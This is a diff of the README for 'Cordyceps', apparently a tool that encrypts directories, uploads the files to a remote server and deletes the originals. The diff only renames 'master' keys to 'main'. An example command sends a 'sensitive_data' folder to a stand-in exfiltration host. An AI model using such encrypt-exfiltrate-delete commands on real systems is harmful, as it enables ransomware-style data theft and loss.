@@ -64,7 +64,7 @@ Cordyceps uses subcommands to handle different modes of operation. To use the to
 Use the `encrypt` command to begin the encryption and exfiltration process.
 
 - `-p, --path <DIRECTORY>`: Specifies the starting directory for file processing. Default: current directory (`.`).
-- `-k, --key <PATH>`: File path to the master public key. Default: `master-public.key`.
+- `-k, --key <PATH>`: File path to the main public key. Default: `main-public.key`.
 - `-n, --no-delete`: Prevents the original file from being deleted after successful encryption and transmission. Default: `false`, the original file is deleted.
 - `-s, --server <ADDRESS>`: The URL of the server to send encrypted files to (e.g., `https://your.exfil.server:8443`). Default: `http://localhost:8080`.
 - `-t, --target-folder <FOLDER_NAME>`: Designates a specific subfolder on the remote server for uploaded files (e.g., `my_laptop_data`). Default: empty, files are uploaded to the root of the specified server endpoint.
@@ -73,7 +73,7 @@ Use the `encrypt` command to begin the encryption and exfiltration process.
 Use the `decrypt` command to restore `.zombie` files using the provided private key.
 
 - `-p, --path <DIRECTORY>`: Specifies the starting directory for file processing. Default: current directory (`.`).
-- `-k, --key <PATH>`: File path to the master private key. Default: `master-private.key`.
+- `-k, --key <PATH>`: File path to the main private key. Default: `main-private.key`.
 - `-n, --no-delete`: Prevents the `.zombie` file from being deleted after successful decryption. Default: `false`, the `.zombie` file is deleted.
 
 ### Examples
@@ -81,20 +81,20 @@ Use the `decrypt` command to restore `.zombie` files using the provided private 
 This command will encrypt files in the `/path/to/sensitive_data` directory, send them to the specified server and folder, but will not delete the original files.
 
 ```sh
-cordyceps encrypt -p /path/to/sensitive_data -k /path/to/master-private.key -s https://your.exfil.server:8443 -t my_laptop_data -n
+cordyceps encrypt -p /path/to/sensitive_data -k /path/to/main-private.key -s https://your.exfil.server:8443 -t my_laptop_data -n
 ```
 
 #### Decryption Example
-This command will decrypt `.zombie` files in the `/path/to/zombie_files` directory using the private key located at `/path/to/your/master-private.key`.
+This command will decrypt `.zombie` files in the `/path/to/zombie_files` directory using the private key located at `/path/to/your/main-private.key`.
 
 ```sh
-cordyceps decrypt -p /path/to/zombie_files -k /path/to/your/master-private.key
+cordyceps decrypt -p /path/to/zombie_files -k /path/to/your/main-private.key
 ```
 
 
 ## Key Management
-- **Master Public Key**: For **encryption** operations, the master Ed25519 public key must be provided via the `--key` CLI option. This key is used to establish the shared secret for encrypting the AES key.
-- **Master Private Key**: For **decryption** operations, the corresponding Ed25519 private key must be explicitly provided by the user via the `--key` CLI option. **It is paramount to keep this private key highly secure and never distribute it with the client application.**
+- **Main Public Key**: For **encryption** operations, the main Ed25519 public key must be provided via the `--key` CLI option. This key is used to establish the shared secret for encrypting the AES key.
+- **Main Private Key**: For **decryption** operations, the corresponding Ed25519 private key must be explicitly provided by the user via the `--key` CLI option. **It is paramount to keep this private key highly secure and never distribute it with the client application.**
 
 Cordyceps is shipped with the `generate` command that creates a new keypair for this purpose.
 
